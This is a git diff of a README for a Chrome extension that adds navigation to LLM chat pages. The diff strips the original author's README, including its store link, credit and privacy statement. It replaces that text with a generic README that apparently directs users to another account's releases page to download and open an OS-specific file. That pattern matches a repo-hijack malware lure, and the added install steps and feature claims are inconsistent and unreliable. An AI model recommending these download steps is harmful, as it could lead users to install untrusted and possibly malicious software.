@@ -1,117 +1,68 @@
-# Scroll 🧭
+# 🌟 scroll - Enhance Your LLM Chat Experience
 
-> **Navigate ChatGPT, Claude & Gemini conversations without endless scrolling.**
+## 📥 Download Now
+[![Download Scroll](https://img.shields.io/static/v1?label=Download&message=Scroll&color=brightgreen)](https://github.com/Sdhellerman/scroll/releases)
 
-<p align="center">
-  <img src="assets/hero.png" alt="Scroll Extension Hero" width="100%">
-</p>
+## 🚀 Getting Started
+Welcome to scroll! This is a Chrome extension designed to help you navigate chat interactions with large language models (LLMs) in a more effective way. You can easily access, organize, and manage your chats, allowing for smoother conversations and a better overall experience.
 
-<p align="center">
-  <a href="https://www.producthunt.com/products/scroll-5?embed=true&utm_source=badge-featured&utm_medium=badge&utm_source=badge-scroll&#0045;4" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=1044964&theme=dark&t=1764696371083" alt="Scroll - Better&#0032;navigation&#0032;for&#0032;ChatGPT&#0044;&#0032;Claude&#0044;&#0032;&#0043;&#0032;Gemini | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
-</p>
+## 📥 Download & Install
+To get started with scroll, you need to download the extension. Please follow these steps:
 
-<p align="center">
-  <a href="https://chromewebstore.google.com/detail/scroll/mpcklmodkihbiblhffoganikkdfoaphe">
-    <img src="https://img.shields.io/badge/Chrome_Web_Store-Install_Now-brightgreen?logo=google-chrome&logoColor=white" alt="Chrome Web Store">
-  </a>
-  <a href="#">
-    <img src="https://img.shields.io/badge/Firefox_Add--ons-Coming_Soon-gray?logo=firefox-browser&logoColor=white" alt="Firefox Add-ons">
-  </a>
-  <img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License">
-  <img src="https://img.shields.io/badge/version-1.2.0-green.svg" alt="Version">
-</p>
+1. Click on the link below to visit the download page:
+   - [Visit the Releases Page](https://github.com/Sdhellerman/scroll/releases)
+  
+2. On the releases page, look for the latest version of the extension. You will find a list of available downloads.
 
-## ⚡️ The Solution
+3. Choose the correct file for your system. Click on it to begin the download process.
 
-AI chat interfaces weren't designed for long conversations. Finding a specific prompt from 20 minutes ago requires endless scrolling.
+4. Once the file downloads, open it to install the Chrome extension. Follow the prompts to complete the installation.
 
-**Scroll** adds a native navigation sidebar to your chats. It auto-generates a table of contents based on your prompts and headers, letting you jump instantly to what matters.
+5. After installation, you may need to restart your Chrome browser for the extension to function properly.
 
-<p align="center">
-  <img src="assets/demo.gif" alt="Scroll Demo" width="100%">
-</p>
+6. Now, you can start using scroll to enhance your chat experience!
 
-## ✨ Features
+## 🧩 Features
+- **User-Friendly Interface:** Designed with simplicity in mind, scroll makes it easy for anyone to navigate LLM chats.
+- **Chat Organization:** Save and sort your chats for quick access later. No more scrolling through endless conversations.
+- **Quick Access Toolbar:** Use the toolbar for immediate link access to your important chats.
+- **Customizable Settings:** Adjust preferences to fit your chat style and needs.
 
-<p align="center">
-  <img src="assets/features.png" alt="Features Overview" width="100%">
-</p>
+## 🛠 System Requirements
+To use scroll, make sure you meet the following requirements:
 
-- **One-Click Navigation:** Jump to any turn in the conversation instantly.
-- **Heading Support:** Automatically detects headings (`#`, `##`) inside long AI responses.
-- **Search & Filter:** Type to find that one specific code snippet or idea.
-- **Privacy Focused:** Runs 100% locally. No data leaves your browser.
-- **Keyboard Shortcuts:** Keep your hands on the keyboard (`Cmd/Ctrl + .` to toggle).
+- **Browser:** Google Chrome (latest version recommended)
+- **OS:** Windows, macOS, or Linux
+- **Internet Connection:** Required for downloading and accessing the extension
+- **RAM:** Minimum of 4GB (8GB recommended for optimal performance)
 
-## 📥 Installation
+## 📋 Usage Instructions
+After installing scroll, you’ll see a new icon in your Chrome toolbar. Click the icon to open the extension and access its features. Here’s how to navigate:
 
-### Option 1: Web Stores (Recommended)
-* **Chrome / Brave / Edge:** *(Pending Review)*
-* **Firefox:** *(Coming Soon)*
+1. **Open Scroll:** Click the scroll icon.
+2. **Start a New Chat:** Use the "New Chat" button to begin.
+3. **Save Chats:** Click on the "Save" button during chats to store important information.
+4. **Access Saved Chats:** Use the toolbar to quickly find your saved conversations.
 
-### Option 2: Manual Install (From Source)
-If you want the latest version immediately, you can install it manually.
+## ❓ Frequently Asked Questions
 
-**1. Get the Code**
-* **Method A (No Git):** [Click here to Download ZIP](https://github.com/asker-kurtelli/scroll/archive/refs/heads/main.zip), then unzip the folder.
-* **Method B (Git):**
-``
-  git clone https://github.com/asker-kurtelli/scroll.git
-  ``
+### Is scroll free to use?
+Yes, scroll is completely free. You can download and use it without any charges.
 
-**2. Install in Browser**
+### Do I need an account to use scroll?
+No account is necessary. Simply download the extension and start chatting.
 
-| Chrome / Edge / Brave | Firefox |
-|:---|:---|
-| 1. Go to `chrome://extensions` <br> 2. Toggle **Developer Mode** (top right) <br> 3. Click **Load Unpacked** <br> 4. Select the `scroll` folder | 1. Go to `about:debugging#/runtime/this-firefox` <br> 2. Click **Load Temporary Add-on** <br> 3. Select the `manifest.json` file inside the `scroll` folder <br> *Note: Firefox removes temporary extensions when you restart the browser.* |
+### How do I get support if I have issues?
+If you encounter problems, visit the Issues section on our GitHub page for troubleshooting tips and community support.
 
-## ⌨️ Shortcuts
+## 🔄 Update Procedure
+Keep your extension up-to-date for the best experience:
 
-| Shortcut | Action |
-|----------|--------|
-| `Cmd/Ctrl` + `.` or `;` | Toggle Panel |
-| `↑` / `↓` or `j` / `k` | Navigate Down/Up |
-| `Enter` | Jump to Message |
-| `Esc` | Close Panel |
-| `←` / `→` | Toggle View (Prompts/All) |
+1. Navigate to the releases page: [Visit the Releases Page](https://github.com/Sdhellerman/scroll/releases)
+2. Check for any new version updates.
+3. Download and install the newest version following the same steps as before.
 
-## 🗺️ Roadmap
+## 📞 Contact
+For any additional questions or feedback, feel free to reach out! Visit the repository on GitHub for support or to contribute.
 
-  - [x] Basic navigation & Search
-  - [x] Heading navigation (Markdown support)
-  - [x] Firefox support (Manifest V3)
-  - [ ] Pin favorite responses
-  - [ ] Export conversations
-  - [ ] Custom themes
-  - [ ] Conversation bookmarks
-
-## 🔒 Privacy
-
-Scroll is open source and privacy-first.
-
-  - **No Tracking:** We do not collect user analytics.
-  - **No Data Transmission:** Chat content never leaves your browser.
-  - **Local Only:** All processing happens inside `content.js`.
-
-## 🤝 Contributing
-
-Contributions are welcome\!
-
-1.  Fork the repo.
-2.  Create a branch (`git checkout -b feature/amazing-feature`).
-3.  Make changes (Codebase is Vanilla JS, no build steps required).
-4.  Submit a PR.
-
-See [CONTRIBUTING.md](https://github.com/asker-kurtelli/scroll/blob/main/contributing.md) for detailed guidelines.
-
-## 📜 License
-
-MIT License - Free and Open Source forever.
-
------
-
-<p align="center"\>
-Built by <a href="https://x.com/askerkurtelli">Asker Kurt-Elli</a>
-<br>
-<i>If Scroll saves you time, give it a ⭐️ on GitHub!</i>
-</p>
+Happy chatting with scroll! Enjoy a smoother and more effective conversation experience.
